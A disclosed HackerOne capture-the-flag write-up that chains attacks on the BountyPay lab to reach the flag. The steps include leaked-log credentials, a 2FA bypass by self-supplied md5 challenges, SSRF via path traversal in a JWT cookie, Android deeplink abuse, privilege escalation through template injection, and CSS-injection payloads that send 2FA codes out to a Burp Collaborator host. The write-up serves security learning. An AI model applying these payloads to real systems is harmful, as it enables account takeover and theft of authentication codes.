# [H1-2006 2020]  Connecting the dots to send hackers their Bug Bounty

## Report Details
- **Report ID**: 889886
- **URL**: https://hackerone.com/reports/889886
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-06-03T09:40:58.779Z
- **Disclosed**: 2020-06-18T00:25:53.002Z

## Reporter
- **Username**: akshansh
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
Hello team Thank you so much for organising the ctf it has helped a lot to learn and improve my knowledge now lets got to solution i have preapred short videos as a refrence for each part and broken down ctf in 8 challenges.

So the ctf was broken into:
1. Gathering leaking to gain login credentials
2. Bypassing 1st 2fa
3. SSrf in cookies to getting the unauthorised apk  
4. Getting Leaked Secret from apk
5. Accessing new employee account
6. Upgrading account privilages to admin and getting admin credentials
7. Login to Martin account and bypass 2nd 2fa
8. Bypass payment 2fa via CSS Injection via ssrf to get the flag

# 1.Gathering leaking to gain login credentials

{F853363}
So first we get that scope of the ctf was *.bountypay.h1ctf.com 
so ran a quick certspotter search on them gave

```
api.bountypay.h1ctf.com		
app.bountypay.h1ctf.com		
software.bountypay.h1ctf.com
staff.bountypay.h1ctf.com	
www.bountypay.h1ctf.com		
```

and running dirsearch on them i was able to see that https://app.bountypay.h1ctf.com/ subdomain git directory was exposed now among its git files the important one 
was /.git/config file which gave me information about this github page https://github.com/bounty-pay-code/request-logger/commit/07e138f46b09e1a702b9df8f1e701db20a38defa#diff-c3692912e7cb4cbcd03da419c135060e
upon visting we get another path ```bp_web_trace.log``` so final path https://app.bountypay.h1ctf.com/p_web_trace.log
were having system logs of brian oliver access
which were base64 encoded log files which upon decoding were

```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```
we get login credentials username":"brian.oliver","password":"V7h0inzX", and 2fa answer for our next stage


# 2. Bypassing 1st 2fa
{F853368}

As soon as we are logged inside the account we face a 2fa now inspecting the page we can see the hidden field was challenge and we had to give a challenge answer as above the challeneg was an md5 hash so upon thinking i tried making an md5(bD83Jk27dQ) that was from earlier logs so the hash came out as ```5828c689761cce705a1c84d9b1a1ed5e``` 
so i made a  request whose body looked like ```username=brian.oliver&password=V7h0inzX&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ```
which upon passing to server successfully bypassed the 2fa.


# 3. SSrf in cookies to getting the unauthorised apk
{F853373}
As we are loggedin we see transaction record window used to fetch statements but as our account is not privileged so we cant fetch documents directly.
The request to fetch documents was send via rest api eg- https://api.bountypay.h1ctf.com/api/accounts/Ae8iJLkn9z/statements?month=01&year=2020
app requesting the api to fetch the records as we request so it was clear the cookie check is in place to check for allowed paths
the cookie we got was a jwt token which on decoding looked like
```{"account_id":"Ae8iJLkn9z","hash":"3616d6b2c15e50c0248b2276b484ddb2"}``` 
the interesting part was here the account_id was not being checked with the hash so we can inject our values and it would be accepted. 
Being stuck here for a moment realised 2 things
 first on api front page we had open redirect 
```https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API``` but it had a filter which only allowed a whitelisted urls

2nd was that https://software.bountypay.h1ctf.com/ was blocked by blocking requesting based upon ip address so it also only allowed urls incoming request via 
specific ips and block other ips 

So combining 2 scenarios i immediately tried ```https://api.bountypay.h1ctf.com/redirect?url=https://software.bountypay.h1ctf.com/``` but response was again unauthorised indicating we cannot do it directly but i tried to think and took an upper case of jwt cookies can we inject our ssrf payload to access the software website
for which our cookie should look like
```{"account_id":"./../../../../redirect?url=https://software.bountypay.h1ctf.com/?","hash":"3616d6b2c15e50c0248b2276b484ddb2"}```
which would traverse backwards in api directory and since its a virualhost this would work in system there locally making a request 
to software subdomain the request gave us a html formatted page via api which looked like a login page 
{F853380}
so we had to similarly guess more directory
now this can be done by bruteforcing the cookies with every time making a directory search via cookie, after doing this for a while the cookie
```{"account_id":"./../../../../redirect?url=https://software.bountypay.h1ctf.com/uploads?","hash":"3616d6b2c15e50c0248b2276b484ddb2"}```
i.e
```
eyJhY2NvdW50X2lkIjoiLi8uLi8uLi8uLi8uLi9yZWRpcmVjdD91cmw9aHR0cHM6Ly9zb2Z0d2FyZS5ib3VudHlwYXkuaDFjdGYuY29tL3VwbG9hZHM/IiwiaGFzaCI6IjM2MTZkNmIyYzE1ZTUwYzAyNDhiMjI3NmI0ODRkZGIyIn0=
```
helped to access an apk file path now we cannot download it via api so i tried appending the path to software url subdomain 
https://software.bountypay.h1ctf.com/BountyPay.apk and the apk was downloaded


#  4. Getting Leaked Secret from apk
{F853400}

On decompiling the apk we can see the first Mainactivity which upon launching  has input fields as username and twitter handle now as we enter the value it acts as a check for first activity 

## On first Activity
to move to second activity without passing checks the way possible was by accessing it via the deeplink since in manifest file we can see the path 
```<data android:scheme="one" android:host="part"/>``` so the link must look like one://part? put to execute it with parameters the java class bounty.pay.PartOneActivity expects ```start``` as parameter 
{F853422}
next checks for the  string PartTwoActivity if both conditions are satisfied then we can execute the deeplink the 
adb command would look like 
```adb shell am start -d one://part?start=PartTwoActivity```

## On 2nd Activity
After this we come to ParTwoActivity and see a blank instance of bounty.pay.PartTwoActivity here the key to jump to third activity properly was to verify checks on submitInfo function which prerequires the input screen to be visible first since we cannot see any fields so we can use our deeplink as used in manifest file to do this task
the visiblity condition would use 
{F853429}

```
String firstParam = data.getQueryParameter("two");
String secondParam = data.getQueryParameter("switch"); if (firstParam != null && firstParam.equals("light") && secondParam != null && secondParam.equals("on"))
``` 
so the deeplink would look like 

```adb shell am start -d "two://part?two=light\&switch=on"```

Now once we see the input field we can see its function handling submitInfo requires  if (str.equals(sb.toString())) which here checks if value Entered is X-Token or not so we simply enter the value and bypass to third activity

## On Third  Activity
Now the third activity was the main thing here we can see that PartThreeActivity function has a run function which will  fetches a token 
now to perform this action 
{F853430}
we can call our deeplink as three://part here parameters are three switch and header but the first two paramter require a base 64 value next on condition check we can see the switch parameter require PartThreeActivity:UGFydFRocmVlQWN0aXZpdHk= as its value switch:b24  requires on its value and header as X-Token
So after passing the deeplink via adb "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token"
we can observe the adb logact throws us 

```
HOST IS: : http://api.bountypay.h1ctf.com
TOKEN IS: : 8e9998ee3137ca9ade8f372739f062c1
HEADER VALUE AND HASH : X-Token: 8e9998ee3137ca9ade8f372739f062c1
```
After entering the hash 8e9998ee3137ca9ade8f372739f062c1 we get get congratsActivity which says information leaked here will help in other areas 
{F853443}
# 5. Accessing new employee account
{F853469}

After getting the X-Token and hostname it was clear that this was used for api.bountypay.h1ctf.com	we had to guess the path with the token so i made a bunch of wordlists based on website such as api,staff,software,admin,app etc and vai intruder bruteforced in this way api.bountypay.h1ctf.com/guesslist/guesslist  with X-Token in header after this i observed that the request 
```
GET /api/staff/ HTTP/1.1
Host: api.bountypay.h1ctf.com
X-Token: 8e9998ee3137ca9ade8f372739f062c1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
``` 
was able to fetch 

```
[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
``` 
but this was something already known for second account and with no login details further this was not much of use at this point on Hackerone Twitter handle which was 	BountyHQ twitter handle which tweeted about their employee Sandra Allison who had put their batch picture which revealed their id 
```
STF:8FJ3KFISL3
``` 
now the GET request was not able to fetch/send this info and get something i tried the post request but the response came back as ["Missing Parameter"] so looking upon the above get request we can see that parameter was staff_id so i tried sending it in a post request as ```staff_id=STF:8FJ3KFISL3``` and the response was her credentials

```
{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```


# 6. Upgrading account privilages to admin and getting admin credentials
{F853471}
Upon logging in as sandra we do not get much thigs to see around apart from settings ticket and homepage the website had an interseting file which was 
https://staff.bountypay.h1ctf.com/js/website.js the file had 2 functions of upgrading user to admin and reporting the url/page now sandra account would not be able to 
directly call the first function as she does not have the rights but the second function was interesting sendReport was available for sandra also it would make the #tab1  triggers element class tab1 
{F853459}
so if we can set username value in here make call via function ```let t=$('input[name="username"]').val();$.get("/admin/upgrade?username="``` then sandra would be upgraded the template would accept array function which would allow you to load more than one templates the use would be 
to make this work we need this template should be one login page and second should be the tickets because here in tickets page as we can see that i have set avatar to  tab1 upgradeToAdmin  this would be used to call function upgradetoAdmin
{F853460}
 but we also need to set username of who is being upgraded so the url should look like https://staff.bountypay.h1ctf.com/?template[]=ticket&ticket_id=358&template[]=home&username=sandra.allison#tab1
where when we submit this report would trigger automatically tab1 then it would call upgrade  for sandra and she would become the admin
After becoming admin see get a admin tab where we get 
Marten credentials
```marten.mickos  h&H5wy2Lggj*kKn4OD&Ype```
{F853461}

# 7. Login to Martin account and bypass 2nd 2fa
{F853472}
As we logged into martin account we saw a 2fa carrying a challenge and a challenge answer last time we had a answer whose md5 was challenge so this time we have
challenge  but no pre answers with us
so the solution to pass this was to take challenge from hidden input field  calling it as A and  md5(A) and the resulting hash B that you will get it would now become the challenge and so your request be something like   
```
challenge=B&challenge_answer=A
```
 which bypasses 2fa and send us to a pay page 


# 8. Bypass payment 2fa via CSS Injection via ssrf to get the flag
{F853475}
After 2fa bypass we see the pay button active for 5th month of year 2020 but upon clcking it asks for to send a challenge and complete it so the challenge upon sending was making a request to a stylesheet so sending any else url the server would make a request to it so a bit later i realised that we can exfiltrate the data for the challenge answer via css injection by sending our css file which would fetch every character from value of challenge but there was a catch in this after sending a request to mywebsite/test.css which was A-Z,a-z,0-9
```
input[name=challenge][value^=A]) ~ * {
    background-image: url(burpcollaborator);
}
```
the request didnt came in burpcollaborator this indicated that input name was not challenge in the backend rather something else so i made some css files to get the name like 

```
input[name^=c] ~ * {
    background-image: url(burpcollaaborator/c);
}
```
so after making some fuzzing around it i was able to get name as code_1,code_2,code_3,code_4,code_5,code_6 but 7th value was not as code_7 maybe so did that via intruder as in video

so to get values  i made the final css for code1-6 values A-Z,a-z,0-9 
```
input[name^=code_1][value^=A] ~ * {
    background-image: url(https://burpcollaborator/code1/A);
}
input[name^=code_2][value^=A] ~ * {
    background-image: url(https://burpcollaborator/code2/A);
}
input[name^=code_3][value^=A] ~ * {
    background-image: url(https://burpcollaborator/code3/A);
}
input[name^=code_4][value^=A] ~ * {
    background-image: url(https://burpcollaborator/code4/A);
}
input[name^=code_5][value^=A] ~ * {
    background-image: url(https://burpcollaborator/code5/A);
}
input[name^=code_6][value^=A] ~ * {
    background-image: url(https://burpcollaborator/code6/A);
}
```
so sending upon this css to app_style fetched me 6 values then 7th value was fetched by loading the position in intruder and sending payloads A-Z,a-z,0-9 
finally the response length 2163 was carrying the flag 


# ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$
{F853462}

## Impact

...

## Attachments
- bounty1.mp4
- bounty2.mp4
- bounty3.mp4
- Screenshot_from_2020-06-03_14-17-32.png
- bounty4.mp4
- Screenshot_from_2020-06-03_11-29-30.png
- Screenshot_from_2020-06-03_11-38-42.png
- Screenshot_from_2020-06-03_12-26-54.png
- Screenshot_20200602-174438_BountyPay.png
- Screenshot_from_2020-06-03_12-43-20.png
- Screenshot_from_2020-06-03_13-16-51.png
- Screenshot_from_2020-06-03_13-22-13.png
- Screenshot_from_2020-06-02_01-55-40.png
- bounty5.mp4
- bounty6.mp4
- bounty7.mp4
- bounty8.mp4
